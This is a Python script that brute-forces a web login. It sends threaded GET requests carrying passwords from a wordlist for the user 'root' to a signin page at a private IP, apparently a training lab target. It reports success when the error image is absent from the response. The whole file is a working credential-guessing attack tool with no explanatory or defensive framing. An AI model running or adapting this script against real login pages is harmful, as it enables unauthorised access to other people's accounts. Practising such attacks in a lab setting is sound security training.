import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://192.168.64.2/index.php"
USER = "root"
FILE = "password.txt"
THREADS = 10

def check(password):
    params = {
        'page': 'signin',
        'username': USER,
        'password': password,
        'Login': 'Login'
    }
    try:
        r = requests.get(URL, params=params, timeout=5)
        if "WrongAnswer.gif" not in r.text:
            return True, password
    except:
        pass
    return False, password

def main():
    try:
        with open(FILE, 'r', encoding='latin-1') as f:
            passwords = [l.strip() for l in f]
        
        print(f"Brutforce with root: {USER} | {len(passwords)} words | {THREADS} threads")
        
        with ThreadPoolExecutor(max_workers=THREADS) as exe:
            futures = {exe.submit(check, p): p for p in passwords}
            for f in as_completed(futures):
                res, password = f.result()
                if res:
                    print(f"Success password is: {password}")
                    exe.shutdown(wait=False, cancel_futures=True)
                    sys.exit(0)
        print("\n[-] No password found.")
    except FileNotFoundError:
        print(f"[!] {FILE} missing.")

if __name__ == "__main__":
    main()